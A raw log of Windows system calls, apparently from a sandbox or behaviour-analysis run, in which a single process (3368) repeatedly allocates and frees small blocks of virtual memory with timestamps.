NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1384448#3368,0,1542888173.20375
NtFreeVirtualMemory,0xffffffff#1380352#32768#3368#0x025f0000,0,1542888173.20375
NtAllocateVirtualMemory,0#0#0xffffffff#0x024b0000#4096#4#0#1388544#3368,0,1542888173.20375
NtFreeVirtualMemory,0xffffffff#1384448#32768#3368#0x02350000,0,1542888173.20375
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1392640#3368,0,1542888173.20375
NtFreeVirtualMemory,0xffffffff#1388544#32768#3368#0x024b0000,0,1542888173.20375
NtAllocateVirtualMemory,0#0#0xffffffff#0x024b0000#4096#4#0#1396736#3368,0,1542888173.21875
NtFreeVirtualMemory,0xffffffff#1392640#32768#3368#0x02350000,0,1542888173.21875
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1400832#3368,0,1542888173.21875
NtFreeVirtualMemory,0xffffffff#1396736#32768#3368#0x024b0000,0,1542888173.21875
NtAllocateVirtualMemory,0#0#0xffffffff#0x024b0000#4096#4#0#1404928#3368,0,1542888173.21875
NtFreeVirtualMemory,0xffffffff#1400832#32768#3368#0x02350000,0,1542888173.21875
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1409024#3368,0,1542888173.21875
NtFreeVirtualMemory,0xffffffff#1404928#32768#3368#0x024b0000,0,1542888173.21875
NtAllocateVirtualMemory,0#0#0xffffffff#0x024b0000#4096#4#0#1413120#3368,0,1542888173.21875
NtFreeVirtualMemory,0xffffffff#1409024#32768#3368#0x02350000,0,1542888173.21875
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1417216#3368,0,1542888173.21875
NtFreeVirtualMemory,0xffffffff#1413120#32768#3368#0x024b0000,0,1542888173.21875
NtAllocateVirtualMemory,0#0#0xffffffff#0x024b0000#4096#4#0#1425408#3368,0,1542888173.21875
NtFreeVirtualMemory,0xffffffff#1417216#32768#3368#0x02350000,0,1542888173.21875
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1429504#3368,0,1542888173.21875
NtFreeVirtualMemory,0xffffffff#1425408#32768#3368#0x024b0000,0,1542888173.21875
NtAllocateVirtualMemory,0#0#0xffffffff#0x024b0000#4096#4#0#1433600#3368,0,1542888173.21875
NtFreeVirtualMemory,0xffffffff#1429504#32768#3368#0x02350000,0,1542888173.21875
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1437696#3368,0,1542888173.21875
NtFreeVirtualMemory,0xffffffff#1433600#32768#3368#0x024b0000,0,1542888173.21875
NtAllocateVirtualMemory,0#0#0xffffffff#0x024b0000#4096#4#0#1441792#3368,0,1542888173.21875
NtFreeVirtualMemory,0xffffffff#1437696#32768#3368#0x02350000,0,1542888173.21875
NtAllocateVirtualMemory,0#0#0xffffffff#0x02610000#4096#4#0#1445888#3368,0,1542888173.21875
NtFreeVirtualMemory,0xffffffff#1441792#32768#3368#0x024b0000,0,1542888173.21875
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1449984#3368,0,1542888173.23475
NtFreeVirtualMemory,0xffffffff#1445888#32768#3368#0x02610000,0,1542888173.23475
NtAllocateVirtualMemory,0#0#0xffffffff#0x024c0000#4096#4#0#1454080#3368,0,1542888173.23475
NtFreeVirtualMemory,0xffffffff#1449984#32768#3368#0x02350000,0,1542888173.23475
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1458176#3368,0,1542888173.23475
NtFreeVirtualMemory,0xffffffff#1454080#32768#3368#0x024c0000,0,1542888173.23475
NtAllocateVirtualMemory,0#0#0xffffffff#0x024c0000#4096#4#0#1462272#3368,0,1542888173.23475
NtFreeVirtualMemory,0xffffffff#1458176#32768#3368#0x02350000,0,1542888173.23475
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1466368#3368,0,1542888173.23475
NtFreeVirtualMemory,0xffffffff#1462272#32768#3368#0x024c0000,0,1542888173.23475
NtAllocateVirtualMemory,0#0#0xffffffff#0x024c0000#4096#4#0#1470464#3368,0,1542888173.23475
NtFreeVirtualMemory,0xffffffff#1466368#32768#3368#0x02350000,0,1542888173.23475
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1474560#3368,0,1542888173.23475
NtFreeVirtualMemory,0xffffffff#1470464#32768#3368#0x024c0000,0,1542888173.23475
NtAllocateVirtualMemory,0#0#0xffffffff#0x024c0000#4096#4#0#1478656#3368,0,1542888173.23475
NtFreeVirtualMemory,0xffffffff#1474560#32768#3368#0x02350000,0,1542888173.23475
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1482752#3368,0,1542888173.23475
NtFreeVirtualMemory,0xffffffff#1478656#32768#3368#0x024c0000,0,1542888173.23475
NtAllocateVirtualMemory,0#0#0xffffffff#0x024c0000#4096#4#0#1486848#3368,0,1542888173.23475
NtFreeVirtualMemory,0xffffffff#1482752#32768#3368#0x02350000,0,1542888173.23475
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1495040#3368,0,1542888173.23475
NtFreeVirtualMemory,0xffffffff#1486848#32768#3368#0x024c0000,0,1542888173.23475
NtAllocateVirtualMemory,0#0#0xffffffff#0x024c0000#4096#4#0#1499136#3368,0,1542888173.23475
NtFreeVirtualMemory,0xffffffff#1495040#32768#3368#0x02350000,0,1542888173.23475
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1503232#3368,0,1542888173.23475
NtFreeVirtualMemory,0xffffffff#1499136#32768#3368#0x024c0000,0,1542888173.23475
NtAllocateVirtualMemory,0#0#0xffffffff#0x024c0000#4096#4#0#1507328#3368,0,1542888173.23475
NtFreeVirtualMemory,0xffffffff#1503232#32768#3368#0x02350000,0,1542888173.23475
NtAllocateVirtualMemory,0#0#0xffffffff#0x02630000#4096#4#0#1511424#3368,0,1542888173.23475
NtFreeVirtualMemory,0xffffffff#1507328#32768#3368#0x024c0000,0,1542888173.23475
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1519616#3368,0,1542888173.23475
NtFreeVirtualMemory,0xffffffff#1511424#32768#3368#0x02630000,0,1542888173.23475
NtAllocateVirtualMemory,0#0#0xffffffff#0x024d0000#4096#4#0#1527808#3368,0,1542888173.23475
NtFreeVirtualMemory,0xffffffff#1519616#32768#3368#0x02350000,0,1542888173.23475
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1531904#3368,0,1542888173.23475
NtFreeVirtualMemory,0xffffffff#1527808#32768#3368#0x024d0000,0,1542888173.23475
NtAllocateVirtualMemory,0#0#0xffffffff#0x024d0000#4096#4#0#1536000#3368,0,1542888173.23475
NtFreeVirtualMemory,0xffffffff#1531904#32768#3368#0x02350000,0,1542888173.23475
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1540096#3368,0,1542888173.23475
NtFreeVirtualMemory,0xffffffff#1536000#32768#3368#0x024d0000,0,1542888173.23475
NtAllocateVirtualMemory,0#0#0xffffffff#0x024d0000#4096#4#0#1544192#3368,0,1542888173.23475
NtFreeVirtualMemory,0xffffffff#1540096#32768#3368#0x02350000,0,1542888173.23475
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1552384#3368,0,1542888173.24975
NtFreeVirtualMemory,0xffffffff#1544192#32768#3368#0x024d0000,0,1542888173.24975
NtAllocateVirtualMemory,0#0#0xffffffff#0x024d0000#4096#4#0#1556480#3368,0,1542888173.24975
NtFreeVirtualMemory,0xffffffff#1552384#32768#3368#0x02350000,0,1542888173.24975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1560576#3368,0,1542888173.24975
NtFreeVirtualMemory,0xffffffff#1556480#32768#3368#0x024d0000,0,1542888173.24975
NtAllocateVirtualMemory,0#0#0xffffffff#0x024d0000#4096#4#0#1564672#3368,0,1542888173.24975
NtFreeVirtualMemory,0xffffffff#1560576#32768#3368#0x02350000,0,1542888173.24975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1568768#3368,0,1542888173.24975
NtFreeVirtualMemory,0xffffffff#1564672#32768#3368#0x024d0000,0,1542888173.24975
NtAllocateVirtualMemory,0#0#0xffffffff#0x024d0000#4096#4#0#1572864#3368,0,1542888173.26575
NtFreeVirtualMemory,0xffffffff#1568768#32768#3368#0x02350000,0,1542888173.26575
NtAllocateVirtualMemory,0#0#0xffffffff#0x02650000#4096#4#0#1576960#3368,0,1542888173.26575
NtFreeVirtualMemory,0xffffffff#1572864#32768#3368#0x024d0000,0,1542888173.26575
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1581056#3368,0,1542888173.26575
NtFreeVirtualMemory,0xffffffff#1576960#32768#3368#0x02650000,0,1542888173.26575
NtAllocateVirtualMemory,0#0#0xffffffff#0x024e0000#4096#4#0#1585152#3368,0,1542888173.26575
NtFreeVirtualMemory,0xffffffff#1581056#32768#3368#0x02350000,0,1542888173.26575
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1597440#3368,0,1542888173.26575
NtFreeVirtualMemory,0xffffffff#1585152#32768#3368#0x024e0000,0,1542888173.26575
NtAllocateVirtualMemory,0#0#0xffffffff#0x024e0000#4096#4#0#1601536#3368,0,1542888173.26575
NtFreeVirtualMemory,0xffffffff#1597440#32768#3368#0x02350000,0,1542888173.26575
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1605632#3368,0,1542888173.26575
NtFreeVirtualMemory,0xffffffff#1601536#32768#3368#0x024e0000,0,1542888173.26575
NtAllocateVirtualMemory,0#0#0xffffffff#0x024e0000#4096#4#0#1609728#3368,0,1542888173.26575
NtFreeVirtualMemory,0xffffffff#1605632#32768#3368#0x02350000,0,1542888173.26575
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1613824#3368,0,1542888173.28175
NtFreeVirtualMemory,0xffffffff#1609728#32768#3368#0x024e0000,0,1542888173.28175
NtAllocateVirtualMemory,0#0#0xffffffff#0x024e0000#4096#4#0#1617920#3368,0,1542888173.28175
NtFreeVirtualMemory,0xffffffff#1613824#32768#3368#0x02350000,0,1542888173.28175
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1622016#3368,0,1542888173.28175
NtFreeVirtualMemory,0xffffffff#1617920#32768#3368#0x024e0000,0,1542888173.28175
NtAllocateVirtualMemory,0#0#0xffffffff#0x024e0000#4096#4#0#1626112#3368,0,1542888173.28175
NtFreeVirtualMemory,0xffffffff#1622016#32768#3368#0x02350000,0,1542888173.28175
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1630208#3368,0,1542888173.28175
NtFreeVirtualMemory,0xffffffff#1626112#32768#3368#0x024e0000,0,1542888173.28175
NtAllocateVirtualMemory,0#0#0xffffffff#0x024e0000#4096#4#0#1638400#3368,0,1542888173.28175
NtFreeVirtualMemory,0xffffffff#1630208#32768#3368#0x02350000,0,1542888173.28175
NtAllocateVirtualMemory,0#0#0xffffffff#0x02670000#4096#4#0#1646592#3368,0,1542888173.28175
NtFreeVirtualMemory,0xffffffff#1638400#32768#3368#0x024e0000,0,1542888173.28175
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1650688#3368,0,1542888173.28175
NtFreeVirtualMemory,0xffffffff#1646592#32768#3368#0x02670000,0,1542888173.28175
NtAllocateVirtualMemory,0#0#0xffffffff#0x024f0000#4096#4#0#1654784#3368,0,1542888173.29675
NtFreeVirtualMemory,0xffffffff#1650688#32768#3368#0x02350000,0,1542888173.29675
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1658880#3368,0,1542888173.29675
NtFreeVirtualMemory,0xffffffff#1654784#32768#3368#0x024f0000,0,1542888173.29675
NtAllocateVirtualMemory,0#0#0xffffffff#0x024f0000#4096#4#0#1662976#3368,0,1542888173.29675
NtFreeVirtualMemory,0xffffffff#1658880#32768#3368#0x02350000,0,1542888173.29675
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1667072#3368,0,1542888173.29675
NtFreeVirtualMemory,0xffffffff#1662976#32768#3368#0x024f0000,0,1542888173.29675
NtAllocateVirtualMemory,0#0#0xffffffff#0x024f0000#4096#4#0#1671168#3368,0,1542888173.29675
NtFreeVirtualMemory,0xffffffff#1667072#32768#3368#0x02350000,0,1542888173.29675
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1675264#3368,0,1542888173.29675
NtFreeVirtualMemory,0xffffffff#1671168#32768#3368#0x024f0000,0,1542888173.29675
NtAllocateVirtualMemory,0#0#0xffffffff#0x024f0000#4096#4#0#1679360#3368,0,1542888173.29675
NtFreeVirtualMemory,0xffffffff#1675264#32768#3368#0x02350000,0,1542888173.29675
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1683456#3368,0,1542888173.29675
NtFreeVirtualMemory,0xffffffff#1679360#32768#3368#0x024f0000,0,1542888173.29675
NtAllocateVirtualMemory,0#0#0xffffffff#0x024f0000#4096#4#0#1687552#3368,0,1542888173.29675
NtFreeVirtualMemory,0xffffffff#1683456#32768#3368#0x02350000,0,1542888173.31275
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1691648#3368,0,1542888173.31275
NtFreeVirtualMemory,0xffffffff#1687552#32768#3368#0x024f0000,0,1542888173.31275
NtAllocateVirtualMemory,0#0#0xffffffff#0x024f0000#4096#4#0#1695744#3368,0,1542888173.31275
NtFreeVirtualMemory,0xffffffff#1691648#32768#3368#0x02350000,0,1542888173.31275
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1699840#3368,0,1542888173.31275
NtFreeVirtualMemory,0xffffffff#1695744#32768#3368#0x024f0000,0,1542888173.31275
NtAllocateVirtualMemory,0#0#0xffffffff#0x024f0000#4096#4#0#1708032#3368,0,1542888173.31275
NtFreeVirtualMemory,0xffffffff#1699840#32768#3368#0x02350000,0,1542888173.31275
NtAllocateVirtualMemory,0#0#0xffffffff#0x026a0000#4096#4#0#1712128#3368,0,1542888173.31275
NtFreeVirtualMemory,0xffffffff#1708032#32768#3368#0x024f0000,0,1542888173.31275
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1716224#3368,0,1542888173.31275
NtFreeVirtualMemory,0xffffffff#1712128#32768#3368#0x026a0000,0,1542888173.31275
NtAllocateVirtualMemory,0#0#0xffffffff#0x02500000#4096#4#0#1720320#3368,0,1542888173.31275
NtFreeVirtualMemory,0xffffffff#1716224#32768#3368#0x02350000,0,1542888173.31275
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1724416#3368,0,1542888173.32875
NtFreeVirtualMemory,0xffffffff#1720320#32768#3368#0x02500000,0,1542888173.32875
NtAllocateVirtualMemory,0#0#0xffffffff#0x02500000#4096#4#0#1728512#3368,0,1542888173.32875
NtFreeVirtualMemory,0xffffffff#1724416#32768#3368#0x02350000,0,1542888173.32875
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1732608#3368,0,1542888173.32875
NtFreeVirtualMemory,0xffffffff#1728512#32768#3368#0x02500000,0,1542888173.32875
NtAllocateVirtualMemory,0#0#0xffffffff#0x02500000#4096#4#0#1736704#3368,0,1542888173.32875
NtFreeVirtualMemory,0xffffffff#1732608#32768#3368#0x02350000,0,1542888173.32875
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1744896#3368,0,1542888173.32875
NtFreeVirtualMemory,0xffffffff#1736704#32768#3368#0x02500000,0,1542888173.32875
NtAllocateVirtualMemory,0#0#0xffffffff#0x02500000#4096#4#0#1748992#3368,0,1542888173.32875
NtFreeVirtualMemory,0xffffffff#1744896#32768#3368#0x02350000,0,1542888173.32875
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1753088#3368,0,1542888173.32875
NtFreeVirtualMemory,0xffffffff#1748992#32768#3368#0x02500000,0,1542888173.32875
NtAllocateVirtualMemory,0#0#0xffffffff#0x02500000#4096#4#0#1757184#3368,0,1542888173.32875
NtFreeVirtualMemory,0xffffffff#1753088#32768#3368#0x02350000,0,1542888173.32875
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1761280#3368,0,1542888173.32875
NtFreeVirtualMemory,0xffffffff#1757184#32768#3368#0x02500000,0,1542888173.32875
NtAllocateVirtualMemory,0#0#0xffffffff#0x02500000#4096#4#0#1765376#3368,0,1542888173.32875
NtFreeVirtualMemory,0xffffffff#1761280#32768#3368#0x02350000,0,1542888173.32875
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1769472#3368,0,1542888173.32875
NtFreeVirtualMemory,0xffffffff#1765376#32768#3368#0x02500000,0,1542888173.32875
NtAllocateVirtualMemory,0#0#0xffffffff#0x02500000#4096#4#0#1773568#3368,0,1542888173.32875
NtFreeVirtualMemory,0xffffffff#1769472#32768#3368#0x02350000,0,1542888173.32875
NtAllocateVirtualMemory,0#0#0xffffffff#0x026c0000#4096#4#0#1777664#3368,0,1542888173.32875
NtFreeVirtualMemory,0xffffffff#1773568#32768#3368#0x02500000,0,1542888173.32875
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1781760#3368,0,1542888173.32875
NtFreeVirtualMemory,0xffffffff#1777664#32768#3368#0x026c0000,0,1542888173.32875
NtAllocateVirtualMemory,0#0#0xffffffff#0x02510000#4096#4#0#1785856#3368,0,1542888173.32875
NtFreeVirtualMemory,0xffffffff#1781760#32768#3368#0x02350000,0,1542888173.32875
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1789952#3368,0,1542888173.32875
NtFreeVirtualMemory,0xffffffff#1785856#32768#3368#0x02510000,0,1542888173.32875
NtAllocateVirtualMemory,0#0#0xffffffff#0x02510000#4096#4#0#1794048#3368,0,1542888173.32875
NtFreeVirtualMemory,0xffffffff#1789952#32768#3368#0x02350000,0,1542888173.32875
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1798144#3368,0,1542888173.32875
NtFreeVirtualMemory,0xffffffff#1794048#32768#3368#0x02510000,0,1542888173.32875
NtAllocateVirtualMemory,0#0#0xffffffff#0x02510000#4096#4#0#1802240#3368,0,1542888173.32875
NtFreeVirtualMemory,0xffffffff#1798144#32768#3368#0x02350000,0,1542888173.32875
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1806336#3368,0,1542888173.34375
NtFreeVirtualMemory,0xffffffff#1802240#32768#3368#0x02510000,0,1542888173.34375
NtAllocateVirtualMemory,0#0#0xffffffff#0x02510000#4096#4#0#1810432#3368,0,1542888173.34375
NtFreeVirtualMemory,0xffffffff#1806336#32768#3368#0x02350000,0,1542888173.34375
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1814528#3368,0,1542888173.34375
NtFreeVirtualMemory,0xffffffff#1810432#32768#3368#0x02510000,0,1542888173.34375
NtAllocateVirtualMemory,0#0#0xffffffff#0x02510000#4096#4#0#1818624#3368,0,1542888173.34375
NtFreeVirtualMemory,0xffffffff#1814528#32768#3368#0x02350000,0,1542888173.34375
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1822720#3368,0,1542888173.34375
NtFreeVirtualMemory,0xffffffff#1818624#32768#3368#0x02510000,0,1542888173.34375
NtAllocateVirtualMemory,0#0#0xffffffff#0x02510000#4096#4#0#1826816#3368,0,1542888173.34375
NtFreeVirtualMemory,0xffffffff#1822720#32768#3368#0x02350000,0,1542888173.34375
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1830912#3368,0,1542888173.34375
NtFreeVirtualMemory,0xffffffff#1826816#32768#3368#0x02510000,0,1542888173.34375
NtAllocateVirtualMemory,0#0#0xffffffff#0x02510000#4096#4#0#1835008#3368,0,1542888173.34375
NtFreeVirtualMemory,0xffffffff#1830912#32768#3368#0x02350000,0,1542888173.34375
NtAllocateVirtualMemory,0#0#0xffffffff#0x026d0000#4096#4#0#1839104#3368,0,1542888173.34375
NtFreeVirtualMemory,0xffffffff#1835008#32768#3368#0x02510000,0,1542888173.34375
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1843200#3368,0,1542888173.34375
NtFreeVirtualMemory,0xffffffff#1839104#32768#3368#0x026d0000,0,1542888173.34375
NtAllocateVirtualMemory,0#0#0xffffffff#0x02520000#4096#4#0#1847296#3368,0,1542888173.34375
NtFreeVirtualMemory,0xffffffff#1843200#32768#3368#0x02350000,0,1542888173.34375
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1851392#3368,0,1542888173.34375
NtFreeVirtualMemory,0xffffffff#1847296#32768#3368#0x02520000,0,1542888173.34375
NtAllocateVirtualMemory,0#0#0xffffffff#0x02520000#4096#4#0#1855488#3368,0,1542888173.34375
NtFreeVirtualMemory,0xffffffff#1851392#32768#3368#0x02350000,0,1542888173.34375
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1859584#3368,0,1542888173.34375
NtFreeVirtualMemory,0xffffffff#1855488#32768#3368#0x02520000,0,1542888173.34375
NtAllocateVirtualMemory,0#0#0xffffffff#0x02520000#4096#4#0#1863680#3368,0,1542888173.35975
NtFreeVirtualMemory,0xffffffff#1859584#32768#3368#0x02350000,0,1542888173.35975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1867776#3368,0,1542888173.35975
NtFreeVirtualMemory,0xffffffff#1863680#32768#3368#0x02520000,0,1542888173.35975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02520000#4096#4#0#1871872#3368,0,1542888173.35975
NtFreeVirtualMemory,0xffffffff#1867776#32768#3368#0x02350000,0,1542888173.35975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1875968#3368,0,1542888173.35975
NtFreeVirtualMemory,0xffffffff#1871872#32768#3368#0x02520000,0,1542888173.35975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02520000#4096#4#0#1880064#3368,0,1542888173.35975
NtFreeVirtualMemory,0xffffffff#1875968#32768#3368#0x02350000,0,1542888173.35975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1884160#3368,0,1542888173.35975
NtFreeVirtualMemory,0xffffffff#1880064#32768#3368#0x02520000,0,1542888173.35975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02520000#4096#4#0#1888256#3368,0,1542888173.35975
NtFreeVirtualMemory,0xffffffff#1884160#32768#3368#0x02350000,0,1542888173.35975
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1892352#3368,0,1542888173.35975
NtFreeVirtualMemory,0xffffffff#1888256#32768#3368#0x02520000,0,1542888173.37475
NtAllocateVirtualMemory,0#0#0xffffffff#0x02520000#4096#4#0#1896448#3368,0,1542888173.37475
NtFreeVirtualMemory,0xffffffff#1892352#32768#3368#0x02350000,0,1542888173.37475
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1900544#3368,0,1542888173.37475
NtFreeVirtualMemory,0xffffffff#1896448#32768#3368#0x02520000,0,1542888173.37475
NtAllocateVirtualMemory,0#0#0xffffffff#0x02520000#4096#4#0#1904640#3368,0,1542888173.37475
NtFreeVirtualMemory,0xffffffff#1900544#32768#3368#0x02350000,0,1542888173.37475
NtAllocateVirtualMemory,0#0#0xffffffff#0x02700000#4096#4#0#1908736#3368,0,1542888173.37475
NtFreeVirtualMemory,0xffffffff#1904640#32768#3368#0x02520000,0,1542888173.37475
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1912832#3368,0,1542888173.37475
NtFreeVirtualMemory,0xffffffff#1908736#32768#3368#0x02700000,0,1542888173.37475
NtAllocateVirtualMemory,0#0#0xffffffff#0x02530000#4096#4#0#1916928#3368,0,1542888173.37475
NtFreeVirtualMemory,0xffffffff#1912832#32768#3368#0x02350000,0,1542888173.37475
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1921024#3368,0,1542888173.37475
NtFreeVirtualMemory,0xffffffff#1916928#32768#3368#0x02530000,0,1542888173.37475
NtAllocateVirtualMemory,0#0#0xffffffff#0x02530000#4096#4#0#1925120#3368,0,1542888173.37475
NtFreeVirtualMemory,0xffffffff#1921024#32768#3368#0x02350000,0,1542888173.37475
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1929216#3368,0,1542888173.37475
NtFreeVirtualMemory,0xffffffff#1925120#32768#3368#0x02530000,0,1542888173.37475
NtAllocateVirtualMemory,0#0#0xffffffff#0x02530000#4096#4#0#1933312#3368,0,1542888173.37475
NtFreeVirtualMemory,0xffffffff#1929216#32768#3368#0x02350000,0,1542888173.37475
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1937408#3368,0,1542888173.37475
NtFreeVirtualMemory,0xffffffff#1933312#32768#3368#0x02530000,0,1542888173.37475
NtAllocateVirtualMemory,0#0#0xffffffff#0x02530000#4096#4#0#1941504#3368,0,1542888173.37475
NtFreeVirtualMemory,0xffffffff#1937408#32768#3368#0x02350000,0,1542888173.37475
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1945600#3368,0,1542888173.37475
NtFreeVirtualMemory,0xffffffff#1941504#32768#3368#0x02530000,0,1542888173.37475
NtAllocateVirtualMemory,0#0#0xffffffff#0x02530000#4096#4#0#1949696#3368,0,1542888173.37475
NtFreeVirtualMemory,0xffffffff#1945600#32768#3368#0x02350000,0,1542888173.37475
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1953792#3368,0,1542888173.39075
NtFreeVirtualMemory,0xffffffff#1949696#32768#3368#0x02530000,0,1542888173.39075
NtAllocateVirtualMemory,0#0#0xffffffff#0x02530000#4096#4#0#1957888#3368,0,1542888173.39075
NtFreeVirtualMemory,0xffffffff#1953792#32768#3368#0x02350000,0,1542888173.39075
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1961984#3368,0,1542888173.39075
NtFreeVirtualMemory,0xffffffff#1957888#32768#3368#0x02530000,0,1542888173.39075
NtAllocateVirtualMemory,0#0#0xffffffff#0x02530000#4096#4#0#1966080#3368,0,1542888173.39075
NtFreeVirtualMemory,0xffffffff#1961984#32768#3368#0x02350000,0,1542888173.39075
NtAllocateVirtualMemory,0#0#0xffffffff#0x02710000#4096#4#0#1970176#3368,0,1542888173.39075
NtFreeVirtualMemory,0xffffffff#1966080#32768#3368#0x02530000,0,1542888173.39075
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1974272#3368,0,1542888173.39075
NtFreeVirtualMemory,0xffffffff#1970176#32768#3368#0x02710000,0,1542888173.39075
NtAllocateVirtualMemory,0#0#0xffffffff#0x02540000#4096#4#0#1978368#3368,0,1542888173.39075
NtFreeVirtualMemory,0xffffffff#1974272#32768#3368#0x02350000,0,1542888173.40675
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1982464#3368,0,1542888173.40675
NtFreeVirtualMemory,0xffffffff#1978368#32768#3368#0x02540000,0,1542888173.40675
NtAllocateVirtualMemory,0#0#0xffffffff#0x02540000#4096#4#0#1986560#3368,0,1542888173.40675
NtFreeVirtualMemory,0xffffffff#1982464#32768#3368#0x02350000,0,1542888173.40675
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1990656#3368,0,1542888173.40675
NtFreeVirtualMemory,0xffffffff#1986560#32768#3368#0x02540000,0,1542888173.40675
NtAllocateVirtualMemory,0#0#0xffffffff#0x02540000#4096#4#0#1994752#3368,0,1542888173.40675
NtFreeVirtualMemory,0xffffffff#1990656#32768#3368#0x02350000,0,1542888173.40675
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#1998848#3368,0,1542888173.40675
NtFreeVirtualMemory,0xffffffff#1994752#32768#3368#0x02540000,0,1542888173.40675
NtAllocateVirtualMemory,0#0#0xffffffff#0x02540000#4096#4#0#2002944#3368,0,1542888173.40675
NtFreeVirtualMemory,0xffffffff#1998848#32768#3368#0x02350000,0,1542888173.40675
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#2007040#3368,0,1542888173.40675
NtFreeVirtualMemory,0xffffffff#2002944#32768#3368#0x02540000,0,1542888173.40675
NtAllocateVirtualMemory,0#0#0xffffffff#0x02540000#4096#4#0#2011136#3368,0,1542888173.40675
NtFreeVirtualMemory,0xffffffff#2007040#32768#3368#0x02350000,0,1542888173.40675
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#2015232#3368,0,1542888173.40675
NtFreeVirtualMemory,0xffffffff#2011136#32768#3368#0x02540000,0,1542888173.40675
NtAllocateVirtualMemory,0#0#0xffffffff#0x02540000#4096#4#0#2019328#3368,0,1542888173.40675
NtFreeVirtualMemory,0xffffffff#2015232#32768#3368#0x02350000,0,1542888173.40675
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#2023424#3368,0,1542888173.40675
NtFreeVirtualMemory,0xffffffff#2019328#32768#3368#0x02540000,0,1542888173.40675
NtAllocateVirtualMemory,0#0#0xffffffff#0x02540000#4096#4#0#2027520#3368,0,1542888173.40675
NtFreeVirtualMemory,0xffffffff#2023424#32768#3368#0x02350000,0,1542888173.40675
NtAllocateVirtualMemory,0#0#0xffffffff#0x02350000#4096#4#0#2031616#3368,0,1542888173.40675
